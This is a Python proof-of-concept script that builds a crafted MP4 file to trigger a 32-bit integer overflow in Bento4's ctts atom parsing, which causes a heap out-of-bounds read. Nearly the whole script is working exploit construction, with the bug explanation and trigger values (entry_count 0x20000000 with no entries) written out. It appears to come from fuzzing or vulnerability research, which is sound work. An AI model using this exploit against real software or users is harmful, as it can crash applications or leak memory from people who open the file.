#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN 001:
AP4_CttsAtom 32-bit integer overflow leading to heap OOB read.

In Ap4CttsAtom.cpp lines 79-80, entry_count * 8 is computed as 32-bit.
When entry_count=0x20000000, the result 0x100000000 wraps to 0, allocating
a 0-byte buffer. m_Entries.SetItemCount() uses 64-bit math and allocates ~1GB
correctly, but the for-loop reading from the zero-size buffer causes OOB reads.

Trigger: ctts atom with size=20 (header only, no entries payload),
         entry_count=0x20000000.
"""

import struct
import os

OUTDIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AtomFactory_cpp"
OUTFILE = os.path.join(OUTDIR, "vuln_001.mp4")


def box(box_type, payload):
    """Build a box: 4-byte size (big-endian) + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload


def full_box(box_type, version, flags, payload):
    """Build a FullBox: box header + version(1) + flags(3) + payload."""
    fb_payload = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF)) + payload
    return box(box_type, fb_payload)


# --- ftyp ---
# ftyp: size(4) + 'ftyp'(4) + major_brand(4) + minor_version(4) + compatible(4)
ftyp = struct.pack(">I", 20) + b'ftyp' + b'isom' + struct.pack(">I", 0) + b'isom'

# --- stco (minimal: 0 entries) ---
# FullBox header + entry_count=0
stco = full_box(b'stco', 0, 0, struct.pack(">I", 0))

# --- stsz (minimal: sample_size=0, sample_count=0) ---
stsz = full_box(b'stsz', 0, 0, struct.pack(">II", 0, 0))

# --- stsc (minimal: 0 entries) ---
stsc = full_box(b'stsc', 0, 0, struct.pack(">I", 0))

# --- ctts (VULNERABLE BOX) ---
# size=20: 4(size)+4(type)+4(version+flags)+4(entry_count) = 16 bytes after box header
# entry_count=0x20000000 but NO actual entries follow (size only covers the header)
ctts_payload = struct.pack(">I", 0)          # version=0, flags=0 packed as FullBox
ctts_entry_count = struct.pack(">I", 0x20000000)
ctts_raw = (struct.pack(">I", 20) + b'ctts' +
            struct.pack(">I", 0) +           # version(1byte)=0 | flags(3bytes)=0
            struct.pack(">I", 0x20000000))   # entry_count

# --- stts (minimal: 0 entries) ---
stts = full_box(b'stts', 0, 0, struct.pack(">I", 0))

# --- stsd (minimal) ---
# FullBox header (version+flags) + entry_count=0, no entries
stsd = full_box(b'stsd', 0, 0, struct.pack(">I", 0))

# --- stbl ---
stbl_payload = stsd + stts + ctts_raw + stsc + stsz + stco
stbl = box(b'stbl', stbl_payload)

# --- dinf / dref ---
# dref FullBox: entry_count=1, one url entry (self-contained)
url_entry = full_box(b'url ', 0, 1, b'')    # flags=1 means self-contained
dref = full_box(b'dref', 0, 0, struct.pack(">I", 1) + url_entry)
dinf = box(b'dinf', dref)

# --- smhd (sound media header) ---
smhd = full_box(b'smhd', 0, 0, struct.pack(">HH", 0, 0))  # balance=0, reserved=0

# --- minf ---
minf_payload = smhd + dinf + stbl
minf = box(b'minf', minf_payload)

# --- mdhd (media header, version 0) ---
# version(0) + flags(0) + creation_time(4) + modification_time(4) +
# timescale(4) + duration(4) + language(2) + pre_defined(2)
mdhd = full_box(b'mdhd', 0, 0, struct.pack(">IIIIHH",
    0,      # creation_time
    0,      # modification_time
    44100,  # timescale
    0,      # duration
    0x15C7, # language ('und' encoded)
    0,      # pre_defined
))

# --- hdlr ---
# version(0)+flags(0)+pre_defined(4)+handler_type(4)+reserved(12)+name(variable,null-term)
hdlr_payload = (struct.pack(">I", 0) +   # pre_defined
                b'soun' +                # handler_type
                struct.pack(">III", 0, 0, 0) +  # reserved
                b'SoundHandler\x00')
hdlr = full_box(b'hdlr', 0, 0, hdlr_payload)

# --- mdia ---
mdia_payload = mdhd + hdlr + minf
mdia = box(b'mdia', mdia_payload)

# --- tkhd (track header, version 0, size=92) ---
# version(0)+flags(3)+creation_time(4)+modification_time(4)+track_ID(4)+
# reserved(4)+duration(4)+reserved2(8)+layer(2)+alt_group(2)+volume(2)+
# reserved3(2)+matrix(36)+width(4)+height(4)
tkhd_payload = struct.pack(">IIIII",
    0,   # creation_time
    0,   # modification_time
    1,   # track_ID
    0,   # reserved
    0,   # duration
)
tkhd_payload += struct.pack(">II", 0, 0)   # reserved2 (8 bytes)
tkhd_payload += struct.pack(">hhhh", 0, 0, 0x0100, 0)  # layer, alt_group, volume, reserved
# matrix (9 x 4 bytes = 36 bytes): identity matrix
tkhd_payload += struct.pack(">iiiiiiiii",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)
tkhd_payload += struct.pack(">II", 0, 0)   # width, height
tkhd = full_box(b'tkhd', 0, 3, tkhd_payload)

# --- trak ---
trak_payload = tkhd + mdia
trak = box(b'trak', trak_payload)

# --- mvhd (movie header, version 0, size=108) ---
# version(0)+flags(0)+creation_time(4)+modification_time(4)+
# timescale(4)+duration(4)+rate(4)+volume(2)+reserved(10)+
# matrix(36)+pre_defined(24)+next_track_ID(4)
mvhd_payload = struct.pack(">IIIII",
    0,       # creation_time
    0,       # modification_time
    1000,    # timescale
    0,       # duration
    0x00010000,  # rate = 1.0
)
mvhd_payload += struct.pack(">H", 0x0100)  # volume = 1.0
mvhd_payload += b'\x00' * 10              # reserved
# matrix identity
mvhd_payload += struct.pack(">iiiiiiiii",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)
mvhd_payload += b'\x00' * 24              # pre_defined
mvhd_payload += struct.pack(">I", 2)      # next_track_ID
mvhd = full_box(b'mvhd', 0, 0, mvhd_payload)

# --- moov ---
moov_payload = mvhd + trak
moov = box(b'moov', moov_payload)

# --- Final file ---
mp4_data = ftyp + moov

os.makedirs(OUTDIR, exist_ok=True)
with open(OUTFILE, 'wb') as f:
    f.write(mp4_data)

print(f"Written {len(mp4_data)} bytes to {OUTFILE}")

# Verify ctts bytes in output
idx = mp4_data.find(b'ctts')
if idx >= 0:
    ctts_slice = mp4_data[idx-4:idx+16]
    size_val = struct.unpack(">I", ctts_slice[:4])[0]
    entry_count_val = struct.unpack(">I", ctts_slice[12:16])[0]
    print(f"ctts found at offset {idx-4}: size={size_val}, entry_count=0x{entry_count_val:08X}")
else:
    print("WARNING: ctts box not found in output!")
